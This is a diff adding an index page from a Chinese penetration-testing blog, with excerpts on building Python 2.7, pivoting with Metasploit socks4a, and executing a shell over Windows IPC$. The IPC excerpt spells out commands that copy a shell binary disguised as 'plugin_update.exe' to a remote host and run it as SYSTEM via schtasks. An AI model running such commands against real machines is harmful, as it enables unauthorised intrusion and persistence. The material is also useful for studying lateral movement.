+        <div class="post-info">
+            
+                <span class="date">2016-09-26</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/python/">python</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;有时迫于无奈,我们需要在目标机器上安装一些自己的工具环境,尤其是linux(默认python版本是2.6.6的,现在有些脚本已经很难跑起来),至于win,其平台下的工具已经非常丰富了,这里就不说了</p>
+<p>0x02 编译安装python2.7:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development tools" -y</span></div><div class="line"><span class="comment"># yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel -y</span></div><div class="line"><span class="comment"># wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># tar xf Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># cd Python-2.7.11</span></div><div class="line"><span class="comment"># ./configure --prefix=/usr/local</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># python2.7</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import sys</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; sys.version</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/26/install-py27-on-centos/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/25/msf-socks4a/">
+                通向彼岸 之内网代理转发 [msf中的socs4a模块使用及meterpreter多级内网穿透]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/scoks4a/">scoks4a</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得用别的socks代理工具太麻烦,不用担心,在msf中同样也为我们提供好了用于socks代理的模块[socks4a],虽然它只是基于scoks4的,但对于我们实际渗透来讲,关系并不大</p>
+<p>0x02 首先,假设我们已经获取了目标系统的一个meterpreter会话,然后,我们发现在该目标机器上存在内网段,此时,我们想继续对目标该内网进行渗透,然后就有了下面的一些内容<br><img src="/img/ipconfig meter.jpg" alt=""><br>
+        </div>
+        <a href="/2016/09/25/msf-socks4a/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/24/ipc-reverse-shell/">
+                win内网中利用ipc弹shell 小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ipc-note/">ipc note</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 首先,想办法把马拷到目标机器上再说:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># net use <span class="symbol">\\</span>192.168.3.168<span class="symbol">\i</span>pc$ /user:administrator "admin!@#45"</div><div class="line"># copy shell.exe <span class="symbol">\\</span>192.168.3.168<span class="symbol">\c</span>$<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\p</span>lugin_update.exe</div></pre></td></tr></table></figure></p>
+<p>0x02 利用最常规的copy[xcopy] &amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就不需要账号密码],但实际测试中不带就拒绝访问,至于具体原因,暂未知,保险起见还是带上):<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># schtasks /create /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /<span class="keyword">tr</span> <span class="keyword">c</span>:\windows\temp\plugin_update.<span class="keyword">exe</span> /sc once /<span class="keyword">st</span> <span class="number">10</span>:<span class="number">29</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /RU System  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span> </div><div class="line"># schtasks /run /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span>  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span>  你也可以不用等,让目标立即运行任务</div><div class="line"># schtasks /F /<span class="keyword">delete</span> /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/24/ipc-reverse-shell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="" href="/page/5/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/7/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
